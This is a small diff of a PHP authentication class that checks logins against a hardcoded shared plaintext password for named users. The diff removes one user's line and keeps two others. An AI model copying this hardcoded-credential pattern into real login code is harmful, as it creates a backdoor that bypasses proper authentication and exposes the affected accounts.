@@ -622,7 +622,6 @@ class bAuth{ // extends myPear_base{
     if (!self::_authenticated() && !empty($login) && !empty($pwd) && !empty($this->localAccount)){
       if (function_exists('pam_auth')) {
 	$fff = 
-	  ($login == 'mps'    && $pwd == 'passParTou') || 
 	  ($login == 'krithi' && $pwd == 'passParTou') || 
 	  ($login == 'timoko' && $pwd == 'passParTou');
 	$pam_auth = pam_auth($login, $pwd, $this->authPAM_Message);
